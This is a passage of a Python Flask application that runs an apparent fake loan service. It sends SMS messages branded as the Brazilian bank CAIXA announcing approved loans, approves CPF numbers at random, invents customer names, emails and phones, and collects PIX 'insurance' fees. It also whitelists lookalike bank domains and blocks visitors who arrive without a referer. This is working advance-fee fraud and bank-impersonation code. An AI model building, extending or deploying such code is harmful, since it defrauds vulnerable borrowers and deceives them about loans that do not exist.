import os
import re
import functools
import time
import random
import string
import json
import urllib.parse
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
import logging
import requests
from typing import Dict, Any, Tuple, Optional, Union
from for4payments import create_payment_api as create_for4payments_api
from novaerapayments import create_payment_api as create_novaera_api
from payment_gateway import get_payment_gateway

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "sua_chave_secreta_aqui")

# Configurar logging
logging.basicConfig(level=logging.INFO)

# Configurações de domínio para restrição de acesso
ALLOWED_DOMAINS = [
    'localhost',
    '127.0.0.1',
    '.replit.dev',
    '.repl.co',
    '.vercel.app',
    '.app',
    '.netlify.app',
    '.pythonanywhere.com',
    '.ngrok.io',
    '.ngrok-free.app',
    'facebook.com',
    '.facebook.com',
    'instagram.com',
    '.instagram.com',
    'fb.me',
    'clck.ru',
    '.youtube.com',
    'youtube.com',
    'youtu.be',
    '.google.com',
    'google.com',
    'canalbrasileirodemarketing.online',
    '.canalbrasileirodemarketing.online',
    'pix.itau.com.br',
    'pix-bb.com',
    'pixbanrisul.com.br',
    'app-bradescocartoes.com.br',
    'app-inter.com.br',
    'for4payments.com.br',
    'whatsapp.com'
]

# Habilitar CORS para permitir solicitações de domínios específicos
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    
    if origin:
        allowed = False
        for domain in ALLOWED_DOMAINS:
            if domain.startswith('.'):
                if origin.endswith(domain):
                    allowed = True
                    break
            elif origin == f"https://{domain}" or origin == f"http://{domain}":
                allowed = True
                break
                
        if allowed:
            response.headers.add('Access-Control-Allow-Origin', origin)
            response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
            response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
            response.headers.add('Access-Control-Allow-Credentials', 'true')
            
    return response

# Decorator para verificar o domínio de referer
def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        referer = request.headers.get('Referer')
        path = request.path

        # Permitir todas as solicitações em ambiente de desenvolvimento
        if 'REPLIT_DB_URL' in os.environ or 'REPL_ID' in os.environ:
            app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {referer}, Path: {path}")
            return f(*args, **kwargs)

        # Verificar se o referer está presente
        if not referer:
            app.logger.warning(f"Acesso negado - Referer ausente para o caminho: {path}")
            return jsonify({'error': 'Acesso não autorizado. Referer ausente.'}), 403

        # Extrair o domínio do referer
        referer_domain = ""
        try:
            referer_parts = referer.split('/')
            if len(referer_parts) >= 3:
                referer_domain = referer_parts[2]
        except Exception as e:
            app.logger.error(f"Erro ao extrair domínio do referer: {str(e)}")
            return jsonify({'error': 'Erro ao processar o referer.'}), 500

        # Verificar se o domínio do referer está na lista de permitidos
        allowed = False
        for domain in ALLOWED_DOMAINS:
            if domain.startswith('.'):
                if referer_domain.endswith(domain):
                    allowed = True
                    break
            elif referer_domain == domain:
                allowed = True
                break

        if allowed:
            return f(*args, **kwargs)
        else:
            app.logger.warning(f"Acesso negado - Domínio não permitido: {referer_domain}, Path: {path}")
            return jsonify({'error': 'Acesso não autorizado. Domínio não permitido.'}), 403

    return decorated_function

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Formatar o número para remover qualquer caractere não-numérico
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            return False, "Formato de telefone inválido. Deve conter 11 dígitos incluindo o DDD."
        
        # Construir a mensagem SMS
        message = f"Seu código de verificação é: {verification_code}"
        
        # Obter a chave da API do ambiente
        api_key = os.environ.get('SMSDEV_API_KEY', '')
        if not api_key:
            return False, "Chave da API SMSDEV não configurada"
        
        # Construir a URL da API
        api_url = "https://api.smsdev.com.br/v1/send"
        
        # Parâmetros da solicitação
        params = {
            "key": api_key,
            "type": 9,  # SMS simples
            "number": formatted_phone,
            "msg": message,
            "short_url": 1  # Ativar encurtamento de URL
        }
        
        # Fazer a solicitação HTTP
        response = requests.get(api_url, params=params)
        
        # Verificar a resposta
        if response.status_code == 200:
            result = response.text.strip()
            # SMSDEV retorna "OK" seguido pelo ID quando bem-sucedido
            if result.startswith("OK"):
                return True, None
            else:
                return False, f"Erro da API SMSDEV: {result}"
        else:
            return False, f"Erro na solicitação HTTP: {response.status_code}"
    
    except Exception as e:
        return False, f"Erro ao enviar SMS: {str(e)}"

def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Formatar o número para remover qualquer caractere não-numérico
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            return False, "Formato de telefone inválido. Deve conter 11 dígitos incluindo o DDD."
        
        # Construir a mensagem SMS
        message = f"Seu código de verificação é: {verification_code}"
        
        # Obter a chave da API do ambiente
        api_key = os.environ.get('OWEN_API_KEY', '')
        if not api_key:
            return False, "Chave da API Owen não configurada"
        
        # Construir a URL da API
        api_url = "https://api.owen.com.br/v2/send"
        
        # Dados da solicitação
        payload = {
            "api_key": api_key,
            "message": message,
            "to": formatted_phone,
            "from": "VERIFICACAO"
        }
        
        # Fazer a solicitação HTTP
        response = requests.post(api_url, json=payload)
        
        # Verificar a resposta
        if response.status_code == 200:
            result = response.json()
            if result.get("success"):
                return True, None
            else:
                return False, f"Erro da API Owen: {result.get('message', 'Erro desconhecido')}"
        else:
            return False, f"Erro na solicitação HTTP: {response.status_code}"
    
    except Exception as e:
        return False, f"Erro ao enviar SMS: {str(e)}"

def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    # Gerar um código de verificação de 6 dígitos
    verification_code = ''.join(random.choices('0123456789', k=6))
    
    # Selecionar a API de SMS com base na configuração
    sms_api = os.environ.get('SMS_API', 'smsdev').lower()
    
    if sms_api == 'owen':
        app.logger.info(f"Enviando código de verificação via Owen SMS API para {phone_number}")
        success, error = send_verification_code_owen(phone_number, verification_code)
    else:  # Default: smsdev
        app.logger.info(f"Enviando código de verificação via SMSDEV API para {phone_number}")
        success, error = send_verification_code_smsdev(phone_number, verification_code)
    
    if success:
        return True, verification_code
    else:
        return False, error

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Formatar o número para remover qualquer caractere não-numérico
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"Formato de telefone inválido: {phone_number}")
            return False
        
        # Obter a chave da API do ambiente
        api_key = os.environ.get('SMSDEV_API_KEY', '')
        if not api_key:
            app.logger.error("Chave da API SMSDEV não configurada")
            return False
        
        # Construir a URL da API
        api_url = "https://api.smsdev.com.br/v1/send"
        
        # Parâmetros da solicitação
        params = {
            "key": api_key,
            "type": 9,  # SMS simples
            "number": formatted_phone,
            "msg": message,
            "short_url": 1  # Ativar encurtamento de URL
        }
        
        # Fazer a solicitação HTTP
        response = requests.get(api_url, params=params)
        
        # Verificar a resposta
        if response.status_code == 200:
            result = response.text.strip()
            # SMSDEV retorna "OK" seguido pelo ID quando bem-sucedido
            if result.startswith("OK"):
                app.logger.info(f"SMS enviado com sucesso para {phone_number} via SMSDEV. Resposta: {result}")
                return True
            else:
                app.logger.error(f"Erro da API SMSDEV: {result}")
                return False
        else:
            app.logger.error(f"Erro na solicitação HTTP a SMSDEV: {response.status_code}")
            return False
    
    except Exception as e:
        app.logger.error(f"Erro ao enviar SMS via SMSDEV: {str(e)}")
        return False

def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Formatar o número para remover qualquer caractere não-numérico
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"Formato de telefone inválido: {phone_number}")
            return False
        
        # Obter a chave da API do ambiente
        api_key = os.environ.get('OWEN_API_KEY', '')
        if not api_key:
            app.logger.error("Chave da API Owen não configurada")
            return False
        
        # Construir a URL da API
        api_url = "https://api.owen.com.br/v2/send"
        
        # Dados da solicitação
        payload = {
            "api_key": api_key,
            "message": message,
            "to": formatted_phone,
            "from": "VERIFICACAO"
        }
        
        # Fazer a solicitação HTTP
        headers = {'Content-Type': 'application/json'}
        response = requests.post(api_url, json=payload, headers=headers)
        
        # Verificar a resposta
        if response.status_code == 200:
            result = response.json()
            if result.get("success"):
                app.logger.info(f"SMS enviado com sucesso para {phone_number} via Owen SMS API. ID: {result.get('id')}")
                return True
            else:
                app.logger.error(f"Erro da API Owen: {result.get('message', 'Erro desconhecido')}")
                return False
        else:
            app.logger.error(f"Erro na solicitação HTTP a Owen: {response.status_code}")
            return False
    
    except Exception as e:
        app.logger.error(f"Erro ao enviar SMS via Owen: {str(e)}")
        return False

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    """
    Envia SMS usando a API configurada (SMSDEV ou Owen)
    """
    try:
        # Formatar nome e valor para a mensagem
        first_name = full_name.split()[0] if full_name else "Cliente"
        formatted_amount = f"{amount:.2f}".replace('.', ',')
        
        # Construir a mensagem
        message = f"[CAIXA] Olá {first_name}, aprovamos seu empréstimo de R$ {formatted_amount}. Em instantes você receberá os próximos passos por SMS. Aguarde."
        
        # Selecionar a API de SMS com base na configuração
        sms_api = os.environ.get('SMS_API', 'smsdev').lower()
        
        if sms_api == 'owen':
            app.logger.info(f"Enviando SMS via Owen SMS API para {phone_number}")
            return send_sms_owen(phone_number, message)
        else:  # Default: smsdev
            app.logger.info(f"Enviando SMS via SMSDEV API para {phone_number}")
            return send_sms_smsdev(phone_number, message)
    
    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False
        
def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    try:
        if not phone_number:
            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
            return False
            
        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
            return False
            
        # Formata CPF para exibição (XXX.XXX.XXX-XX)
        cpf_formatado = format_cpf(cpf) if cpf else ""
        
        # Criar mensagem personalizada com link para thank_you_url
        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
        
        # Extrair os parâmetros do URL de agradecimento para personalizar a mensagem
        import urllib.parse
        parsed_url = urllib.parse.urlparse(thank_you_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Obter valores importantes para mensagem SMS
        bank = query_params.get('bank', [''])[0]
        loan_amount = query_params.get('loan_amount', [''])[0]
        pix_key = query_params.get('pix_key', [''])[0]
        
        app.logger.info(f"[PROD] Valores extraídos do URL para SMS: banco={bank}, empréstimo={loan_amount}, PIX={pix_key}")
        
        # Garantir que a URL está codificada corretamente
        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
        import urllib.parse
        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
            # Extrair a base da URL e os parâmetros
            if '?' in thank_you_url:
                base_url, query_part = thank_you_url.split('?', 1)
                params = {}
                for param in query_part.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Recriar a URL com parâmetros codificados
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url = f"{base_url}?{query_string}"
                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
        
        # Mensagem mais informativa para o cliente
        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo de R${loan_amount} via {bank} já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
        
        # Log detalhado para debugging
        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
        
        # Fazer várias tentativas de envio para maior garantia
        max_attempts = 3
        attempt = 0
        success = False
        
        while attempt < max_attempts and not success:
            attempt += 1
            try:
                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
                success = send_sms_smsdev(phone_number, message)
                
                if success:
                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
                    break
                else:
                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
            except Exception as e:
                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
        
        return success

    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    random_domain = random.choice(['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com'])
    
    # Se o nome estiver vazio após a limpeza, use um valor padrão
    if not clean_name:
        clean_name = "cliente"
    
    return f"{clean_name}{random_number}@{random_domain}"

def format_cpf(cpf: str) -> str:
    # Remove qualquer caractere não-numérico
    digits = re.sub(r'\D', '', cpf)
    
    # Se não tiver o número correto de dígitos, retorna o valor original
    if len(digits) != 11:
        return cpf
    
    # Formata o CPF (XXX.XXX.XXX-XX)
    return f"{digits[:3]}.{digits[3:6]}.{digits[6:9]}-{digits[9:]}"

def generate_random_phone():
    # Gerar DDD válido (entre 11 e 99)
    ddd = random.randint(11, 99)
    
    # Gerar parte principal do telefone (8 dígitos para celular)
    # Primeiro dígito de celular sempre é 9
    digits = '9' + ''.join(random.choices(string.digits, k=7))
    
    return f"{ddd}{digits}"

def generate_qr_code(pix_code: str) -> str:
    """
    Function to generate QR code
    """
    try:
        import qrcode
        from io import BytesIO
        import base64
        
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        
        qr.add_data(pix_code)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode("utf-8")
        
        return f"data:image/png;base64,{img_str}"
    except Exception as e:
        app.logger.error(f"Error generating QR code: {str(e)}")
        return ""

@app.route('/')
@check_referer
def index():
    try:
        # Obter dados do cliente da query string (se houver)
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        # Preparar objeto de cliente para o template
        customer_data = {
            'nome': nome,
            'cpf': cpf,
            'phone': phone
        }
        
        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
        return render_template('index.html', customer=customer_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/payment')
@check_referer
def payment():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")

        # Inicializa a API de pagamento usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        customer_phone = phone.replace('\D', '') if phone else generate_random_phone()

        # Define o valor baseado na origem
        if source == 'insurance':
            amount = 47.60  # Valor fixo para o seguro
        elif source == 'index':
            amount = 142.83
        else:
            amount = 74.90

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': customer_phone,
            'amount': amount
        }

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pixQrCode') or pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pixCode') or pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Se a API não fornecer um QR code, mas fornecer o código PIX, gerar o QR code
            if pix_code:
                qr_code = generate_qr_code(pix_code)
            else:
                app.logger.error("[PROD] PIX code não encontrado na resposta da API")
                return jsonify({'error': 'Erro ao gerar o QR code do PIX'}), 500

        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Adicionando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        else:
            return jsonify({'error': 'Erro ao gerar PIX'}), 500

@app.route('/payment-update')
@check_referer
def payment_update():
    """
    Rota para verificar e atualizar o status do pagamento periodicamente
    """
    try:
        transaction_id = request.args.get('transaction_id')
        if not transaction_id:
            return jsonify({"status": "error", "message": "ID da transação não fornecido"}), 400

        # Obter dados do cliente para logging e potencial uso em mensagens
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para: nome={nome}, cpf={cpf}, phone={phone}")
        
        # Inicializa a API de pagamento
        api = get_payment_gateway()
        
        # Verificar o status do pagamento
        result = api.check_payment_status(transaction_id)
        
        # Log do resultado
        app.logger.info(f"[PROD] Resultado da verificação de status para {transaction_id}: {result}")
        
        # Processar o resultado conforme a API
        status = result.get('status') or result.get('originalStatus') or result.get('original_status', 'UNKNOWN')
        
        # Normalizar status para maiúsculas para fazer comparações consistentes
        status = status.upper()
        
        # Verificar se o pagamento foi aprovado
        is_completed = status in ['COMPLETED', 'COMPLETE', 'SUCCESS', 'APPROVED']
        is_approved = status in ['APPROVED', 'PAYED', 'PAID']
        is_pending = status in ['PENDING', 'WAITING', 'PROCESSING']
        is_cancelled = status in ['CANCELLED', 'CANCELED', 'FAILED', 'EXPIRED']
        
        # Preparar a resposta
        response = {
            "status": status,
            "approved": is_completed or is_approved,
            "pending": is_pending
        }
        
        # Log status para depuração
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status}")
        
        # Se o pagamento foi aprovado e há um número de telefone, enviar SMS
        if (is_completed or is_approved) and phone:
            app.logger.info(f"[PROD] Pagamento aprovado! Preparando para enviar SMS para {phone}")
            
            # Preparar URL da página de agradecimento com parâmetros
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter parâmetros adicionais (banco, chave PIX e valor do empréstimo) da URL
            bank = request.args.get('bank', '')
            pix_key = request.args.get('pix_key', '')
            loan_amount = request.args.get('amount', '')
            
            # Se não tiver os valores, tentar obter de outros parâmetros
            if not loan_amount:
                loan_amount = request.args.get('loan_amount', '')
                
            # Log para verificar valores
            app.logger.info(f"[PROD] Valores para SMS: banco={bank}, pix_key={pix_key}, loan_amount={loan_amount}")
            
            # Valores padrão se necessário
            if not bank:
                bank = 'Banco do Brasil'
            if not pix_key:
                pix_key = cpf
            if not loan_amount:
                loan_amount = '10000'
            
            # Adicionar parâmetros à URL
            params = {
                'nome': nome,
                'cpf': cpf,
                'phone': phone,
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount
            }
            
            # Codificar os parâmetros corretamente usando urllib
            query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items() if value])
            if query_string:
                thank_you_url += '?' + query_string
                
            # Log da URL completa
            app.logger.info(f"[PROD] URL de agradecimento: {thank_you_url}")
            
            # Múltiplas tentativas para enviar o SMS
            max_attempts = 3
            attempt = 0
            sms_sent = False
                
            while attempt < max_attempts and not sms_sent:
                attempt += 1
                try:
                    app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
                    
                    # Formatar o nome para exibição
                    nome_formatado = nome.split()[0] if nome else "Cliente"
                    
                    # Mensagem personalizada com link para thank_you_url
                    message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
                    
                    # Chamar diretamente a função SMSDEV
                    sms_sent = send_sms_smsdev(phone, message)
                    
                    if sms_sent:
                        app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
                        break
                    else:
                        app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
                        time.sleep(1.5)  # Intervalo maior entre tentativas
                except Exception as e:
                    app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
                    time.sleep(1.0)
                
                # Tente a função especializada como backup se as tentativas diretas falharem
                if not sms_sent:
                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                
                if sms_sent:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
        else:
            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status}")
        
        # Adicionar informações extras ao status para o frontend
        response['phone_provided'] = bool(phone)
        response['thank_you_url'] = thank_you_url if (is_completed or is_approved) else None
        
        # Incluir o código PIX e QR code para permitir renovação de pagamento
        if is_pending or is_cancelled:
            response['pix_code'] = result.get('pixCode') or result.get('pix_code')
            response['pix_qr_code'] = result.get('pixQrCode') or result.get('pix_qr_code')
        
        return jsonify(response)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
@check_referer
def check_payment_status(transaction_id):
    """
    Rota para verificar o status do pagamento de forma direta (sem template)
    """
    try:
        if not transaction_id:
            return jsonify({"status": "error", "message": "ID da transação não fornecido"}), 400
        
        # Obter dados do cliente para logging e potencial uso em mensagens
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")

        if phone:
            # Formatar o número de telefone (remover caracteres não numéricos)
            formatted_phone = re.sub(r'\D', '', phone)
            
            # Verificar se o telefone tem o número correto de dígitos (11 para Brasil: DDD + número)
            if len(formatted_phone) == 11:
                app.logger.info(f"[PROD] Telefone válido para SMS: {phone}")
            else:
                app.logger.warning(f"[PROD] Telefone com formato inválido: {phone}")
                phone = None  # Não usar um telefone com formato inválido
        
        # Inicializa a API de pagamento
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id}")
        api = get_payment_gateway()
        
        # Verificar o status do pagamento
        result = api.check_payment_status(transaction_id)
        status_data = {}
        
        # Diferentes APIs podem retornar formatos diferentes
        if isinstance(result, dict):
            status_data = result
        else:
            # Se não for um dicionário, tentar fazer parse como JSON
            try:
                status_data = json.loads(result)
            except:
                status_data = {"original_status": "ERROR", "message": "Formato de resposta inválido"}
        
        # Obter o status original para log
        original_status = status_data.get('status') or status_data.get('originalStatus') or status_data.get('original_status', 'UNKNOWN')
        
        # Normalizar status para maiúsculas
        status = original_status.upper() if original_status else 'UNKNOWN'
        
        # Adicionar o status original ao resultado para o frontend
        status_data['original_status'] = status
        
        # Verificar se o pagamento foi aprovado
        is_completed = status in ['COMPLETED', 'COMPLETE', 'SUCCESS']
        is_approved = status in ['APPROVED', 'PAYED', 'PAID']
        
        # Verificar se o pagamento foi aprovado
        if is_completed or is_approved:
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado via For4Payments. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter dados adicionais (banco, chave PIX e valor do empréstimo) da URL
            # Garantir que estamos usando os valores reais informados pelo cliente
            bank = request.args.get('bank', '')
            pix_key = request.args.get('pix_key', '')
            # Primeiro tenta obter valor pelo parâmetro amount, depois loan_amount
            loan_amount = request.args.get('amount', '')
            if not loan_amount:
                loan_amount = request.args.get('loan_amount', '')
            
            app.logger.info(f"[PROD] Valores originais para SMS: banco={bank}, pix_key={pix_key}, loan_amount={loan_amount}")
            
            # Valores padrão somente se necessário
            if not bank:
                bank = 'Banco do Brasil'
            if not pix_key:
                pix_key = cpf if cpf else ''
            if not loan_amount:
                loan_amount = '10000'
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_data)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/verificar-cpf', methods=['POST', 'GET'])
@check_referer
def verificar_cpf():
    try:
        # Obter o CPF do formulário
        cpf = request.form.get('cpf') if request.method == 'POST' else request.args.get('cpf')
        
        if not cpf:
            return jsonify({'error': 'CPF não fornecido'}), 400
        
        # Remover qualquer caractere não-numérico
        cpf_digits = re.sub(r'\D', '', cpf)
        
        # Verificar se o CPF tem 11 dígitos
        if len(cpf_digits) != 11:
            return jsonify({'valid': False, 'message': 'CPF inválido. Deve conter 11 dígitos.'})
        
        # Verificar se todos os dígitos são iguais (CPF inválido)
        if len(set(cpf_digits)) == 1:
            return jsonify({'valid': False, 'message': 'CPF inválido. Todos os dígitos são iguais.'})
        
        # Implementar verificação mais complexa do CPF se necessário
        # Aqui estamos apenas verificando o formato básico
        
        # Simular busca em um banco de dados (aprovação aleatória para demonstração)
        probability_approved = 0.6  # 60% de chance de aprovação
        is_approved = random.random() < probability_approved
        
        # Preparar os dados de resposta
        min_value = 3000 if is_approved else 0
        max_value = 10000 if is_approved else 0
        
        response = {
            'valid': True,
            'cpf': format_cpf(cpf),
            'approved': is_approved,
            'min_amount': min_value,
            'max_amount': max_value,
            'message': 'CPF aprovado para empréstimo!' if is_approved else 'CPF não elegível no momento.'
        }
        
        return jsonify(response)
        
    except Exception as e:
        app.logger.error(f"Erro ao verificar CPF: {str(e)}")
        return jsonify({'error': 'Erro ao processar a solicitação'}), 500

@app.route('/buscar-cpf', methods=['POST'])
@check_referer
def buscar_cpf():
    try:
        # Obter o CPF parcial do formulário
        partial_cpf = request.form.get('partial_cpf')
        
        if not partial_cpf:
            return jsonify({'error': 'CPF parcial não fornecido'}), 400
        
        # Remover qualquer caractere não-numérico
        digits = re.sub(r'\D', '', partial_cpf)
        
        # Verificar se temos pelo menos 6 dígitos
        if len(digits) < 6:
            return jsonify({'found': False, 'message': 'Digite pelo menos 6 dígitos do CPF.'})
        
        # Simular busca em um banco de dados (resultados aleatórios para demonstração)
        found = random.random() < 0.7  # 70% de chance de encontrar
        
        if found:
            # Completar o CPF com dígitos aleatórios se necessário
            if len(digits) < 11:
                remaining = 11 - len(digits)
                digits += ''.join(random.choices('0123456789', k=remaining))
            
            # Gerar um nome aleatório
            first_names = ['Ana', 'João', 'Maria', 'Pedro', 'Carlos', 'Lúcia', 'Roberto', 'Patricia']
            last_names = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida']
            
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
            
            response = {
                'found': True,
                'cpf': format_cpf(digits),
                'name': name,
                'message': 'CPF encontrado em nossa base de dados.'
            }
        else:
            response = {
                'found': False,
                'message': 'CPF não encontrado em nossa base de dados.'
            }
        
        return jsonify(response)
        
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF: {str(e)}")
        return jsonify({'error': 'Erro ao processar a solicitação'}), 500

@app.route('/input-cpf')
@check_referer
def input_cpf():
